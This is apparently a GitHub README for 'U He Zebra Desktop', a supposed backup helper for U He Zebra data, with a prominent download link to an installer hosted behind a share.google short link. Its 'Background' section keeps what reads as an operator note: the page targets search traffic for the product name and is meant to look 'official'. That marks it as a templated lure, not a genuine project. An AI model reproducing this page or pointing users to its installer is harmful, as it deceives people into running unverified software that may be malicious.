![U He Zebra Desktop](assets/hero.png)

# U He Zebra Desktop

*Archive U He Zebra files on this machine before you change the install.*

## What U He Zebra Desktop is

**U He Zebra Desktop** runs on your own PC. Keep U He Zebra data folders on disk: dated copies of config and export files before a patch.

Patches move U He Zebra data paths without warning.

No browser upload step: the work happens on disk, then you keep the output folder.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Features

- Locates U He Zebra user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Background

Search traffic for U He Zebra is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/carlwilliams10-web/u-he-zebra-desktop

MIT license. See `LICENSE`.
